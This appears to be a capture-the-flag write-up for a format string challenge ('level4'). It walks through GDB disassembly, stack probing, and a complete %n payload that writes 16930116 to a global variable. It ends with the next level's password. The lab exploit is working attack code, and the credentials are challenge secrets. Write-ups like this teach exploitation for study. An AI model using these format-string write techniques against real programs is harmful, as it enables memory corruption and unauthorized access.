# Level 4 - Advanced Format String Exploitation

## Code Analysis

### Function Structure

The program follows a similar pattern to level3 with key differences:

1. `main` calls the `n` function (takes no parameters)
2. Uses `fgets` to read user input
3. Calls the `p` function, which uses `printf` without a format specifier (vulnerable)
4. Checks if global variable `m` equals a specific value

### The Critical Difference

The comparison involves a much larger value: **16930116** (hexadecimal: `0x1025544`)

This presents a challenge: writing 16+ million bytes using padding alone is impractical.

## The Solution: Dynamic Field Width

### Using %d for Large Values

The `%d` format specifier accepts a **field width modifier**, allowing us to specify large numbers efficiently:
```
%16930116d
```

This prints a decimal number padded to 16930116 characters, without requiring actual byte padding.

## Exploitation Process

### Step 1: Locating the Target Variable

Using GDB to examine the comparison operation:
```gdb
0x0804848d <+54>:	mov    0x8049810,%eax
0x08048492 <+59>:	cmp    $0x1025544,%eax
```

**Address of global variable `m`:** `0x8049810`

**Little-endian representation:** `\x10\x98\x04\x08`

### Step 2: Finding Stack Position

We locate where our input appears on the stack:
```bash
python -c 'print "BBBB" + " %x" * 20' > /tmp/exploit4
cat /tmp/exploit4 | ./level4
```

The pattern `42424242` ("BBBB") is found at the **12th position**.

### Step 3: Payload Construction

#### Required Value Calculation

- Target value: 16930116 bytes
- Address contributes: 4 bytes
- Field width needed: 16930116 - 4 = **16930112**

#### Final Payload Structure
```bash
python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit4
```

**Payload breakdown:**
- `\x10\x98\x04\x08`: Address of `m` in little-endian (4 bytes)
- `%16930112d`: Dynamic field width to reach target byte count
- `%12$n`: Write total byte count to the 12th stack position

## Key Difference from Level 3

Instead of literal padding bytes (`"B" * 60`), we use the `%d` format specifier with a large field width modifier. This is essential for writing large values without creating massive exploit files.

## Executing the Exploit
```bash
cat /tmp/exploit4 | ./level4
```

**Note:** Unlike previous levels, we don't need to keep stdin open with `-` because the program automatically executes `cat` to display the password file upon successful exploitation.

## Retrieving the Password

The password is displayed automatically after exploitation.

## Credentials

**Username:** level5  
**Password:** `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`

## Summary

This level builds upon format string exploitation with an important enhancement:

**Key concepts:**
- Handling large target values in format string attacks
- Using dynamic field width modifiers (`%Nd`)
- Efficient payload construction for multi-million byte writes
- Understanding the relationship between printed bytes and `%n`
- Positional parameter syntax for precise stack targeting

The technique demonstrates how format string vulnerabilities can write arbitrary values to memory locations, even when those values are impractically large for direct padding methods.